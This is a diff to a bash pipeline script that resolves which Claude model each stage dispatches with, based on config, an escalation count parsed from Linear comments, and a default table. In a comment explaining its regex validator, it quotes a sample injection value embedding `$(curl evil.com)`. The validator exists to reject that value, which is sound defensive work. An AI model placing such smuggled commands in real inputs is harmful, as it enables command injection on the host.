@@ -94,6 +94,112 @@ _cost_flags_for() {
   ' "$f" 2>/dev/null || true
 }
 
+# ─── Per-stage model resolver (ENG-103) ───────────────────────────────────
+# Count <!-- pipeline: verdict result=fail target=<stage> --> markers newer
+# than the most recent <!-- pipeline: transition ... to=<stage> --> comment.
+# Used by _resolve_dispatch_model's escalation predicate (ENG-103 D-002).
+# Reuses the comment-fetch path from guards.sh::count_marker_since_last_transition
+# but projects each body through parse_pipeline_marker (common.sh) so prose-
+# quoted markers don't register (ENG-87 / ENG-61 Bug A precedent). Fail-open:
+# Linear API outage returns 0 (no escalation) — matches the dispatch-side
+# fail-open posture of _entry_conditions_gate's ENG-86 block.
+_count_loopback_rejections_for_stage() {
+  local ident="$1" stage="$2"
+  local comments
+  comments="$(bash "$SCRIPT_DIR/linear.sh" get-comments "$ident" 2>/dev/null)" \
+    || { printf '0'; return 0; }
+  [[ -z "$comments" || "$comments" == "null" ]] && { printf '0'; return 0; }
+
+  # Find most recent transition.to=<stage> createdAt (empty → count all).
+  local last_ts="" body ts ev event_field to_field
+  while IFS=$'\t' read -r ts body; do
+    [[ -z "$ts" ]] && continue
+    ev="$(parse_pipeline_marker "$body" 2>/dev/null || true)"
+    [[ -z "$ev" ]] && continue
+    event_field="$(jq -r '.event // ""' <<<"$ev" 2>/dev/null || printf '')"
+    to_field="$(jq -r '.to // ""' <<<"$ev" 2>/dev/null || printf '')"
+    if [[ "$event_field" == "transition" && "$to_field" == "$stage" ]]; then
+      [[ "$ts" > "$last_ts" ]] && last_ts="$ts"
+    fi
+  done < <(jq -r '.[] | "\(.createdAt)\t\(.body | gsub("\n"; " "))"' <<<"$comments" 2>/dev/null)
+
+  # Count verdict.result=fail.target=<stage> newer than last_ts.
+  local count=0 result_field target_field
+  while IFS=$'\t' read -r ts body; do
+    [[ -z "$ts" ]] && continue
+    [[ -n "$last_ts" && ! "$ts" > "$last_ts" ]] && continue
+    ev="$(parse_pipeline_marker "$body" 2>/dev/null || true)"
+    [[ -z "$ev" ]] && continue
+    event_field="$(jq -r '.event // ""' <<<"$ev" 2>/dev/null || printf '')"
+    result_field="$(jq -r '.result // ""' <<<"$ev" 2>/dev/null || printf '')"
+    target_field="$(jq -r '.target // ""' <<<"$ev" 2>/dev/null || printf '')"
+    if [[ "$event_field" == "verdict" \
+       && "$result_field" == "fail" \
+       && "$target_field" == "$stage" ]]; then
+      count=$((count + 1))
+    fi
+  done < <(jq -r '.[] | "\(.createdAt)\t\(.body | gsub("\n"; " "))"' <<<"$comments" 2>/dev/null)
+
+  printf '%s' "$count"
+}
+
+# Resolve the model identifier for a dispatched stage. Precedence (highest →
+# lowest), mirroring _cfg_minutes at bin/dispatch.sh:469-488:
+#   1. .pipeline-config/config.json::dispatch.model[<stage>]
+#   2. Built-in escalation override on implementing/ui when
+#      _count_loopback_rejections_for_stage >= 1.
+#   3. Built-in default table (ENG-103 D-001).
+#   4. Unset → empty stdout → dispatch.sh omits --model.
+# Validation: claude model identifiers match [A-Za-z0-9._\[\]:-]+. Regex-fail
+# at layer 1 logs a warning and falls through to layer 2/3.
+_resolve_dispatch_model() {
+  local stage="$1" ident="$2"
+
+  # Layer 1: operator-pinned config. `strings` filter discards non-string
+  # types (jq integer 60 → no output) so type-mismatched config silently
+  # falls through. Regex validator then rejects shell-meta payloads
+  # (`claude$(curl evil.com)` contains `$()` which is NOT in the char class).
+  # The optional `\[...\]` suffix accommodates `claude-opus-4-7[1m]` 1M-context
+  # form without admitting brackets anywhere else in the identifier.
+  if [[ -f "$CONFIG" ]]; then
+    local _cfg
+    _cfg="$(jq -r --arg s "$stage" '(.dispatch.model[$s] | strings) // empty' \
+      "$CONFIG" 2>/dev/null || true)"
+    if [[ -n "$_cfg" ]]; then
+      if [[ "$_cfg" =~ ^[A-Za-z0-9._:-]+(\[[A-Za-z0-9._:-]+\])?$ ]]; then
+        printf '%s' "$_cfg"; return 0
+      else
+        log "_resolve_dispatch_model: rejecting config value for $stage (failed regex); falling through" >&2
+      fi
+    fi
+  fi
+
+  # Layer 2: escalation override (implementing | ui only).
+  case "$stage" in
+    implementing|ui)
+      local _count
+      _count="$(_count_loopback_rejections_for_stage "$ident" "$stage" 2>/dev/null || printf '0')"
+      if [[ "$_count" =~ ^[0-9]+$ ]] && (( _count >= 1 )); then
+        printf 'claude-opus-4-7'; return 0
+      fi
+      ;;
+  esac
+
+  # Layer 3: built-in default table (ENG-103 D-001).
+  case "$stage" in
+    brainstorming) printf 'claude-opus-4-7' ;;
+    planning)      printf 'claude-opus-4-7' ;;
+    # implementing default: stays Opus until ENG-101 stabilises (D-008);
+    # flip to claude-sonnet-4-6 in follow-up commit when ENG-101 ships.
+    implementing)  printf 'claude-opus-4-7' ;;
+    ui)            printf 'claude-sonnet-4-6' ;;
+    reviewing)     printf 'claude-opus-4-7' ;;
+    qa)            printf 'claude-sonnet-4-6' ;;
+    building)      printf 'claude-haiku-4-5-20251001' ;;
+    *)             printf '' ;;  # released, retrospective → subscription default
+  esac
+}
+
 # Format: leading newline so the caller can append unconditionally.
 # Cache% (D-007): round(100 * cache_read / (cache_read + cache_create)).
 # When read+create == 0, omit the `· cache N%` segment entirely — do NOT
@@ -1156,8 +1262,17 @@ main() {
     # Dispatch. Export PIPELINE_ISSUE_ID so dispatch.sh can resolve the
     # per-stage usage-file path (ENG-26 D-012). Ambient-context env var
     # mirrors the existing PIPELINE_DRY_RUN pattern (common.sh:171).
+    # ENG-103: resolve per-stage model and hand off via PIPELINE_DISPATCH_MODEL.
+    # Empty string propagates unchanged; dispatch.sh's `[[ -n ... ]]` test
+    # elides the --model flag in that case (preserving subscription default).
     local dispatch_rc=0
+    local resolved_model
+    resolved_model="$(_resolve_dispatch_model "$stage" "$ident" 2>/dev/null || printf '')"
+    if [[ -n "$resolved_model" ]]; then
+      log "dispatch model=$resolved_model (stage=$stage)"
+    fi
     PIPELINE_ISSUE_ID="$ident" \
+      PIPELINE_DISPATCH_MODEL="$resolved_model" \
       bash "$SCRIPT_DIR/dispatch.sh" "$stage" "$prompt_file" "$log_file" \
       || dispatch_rc=$?
 
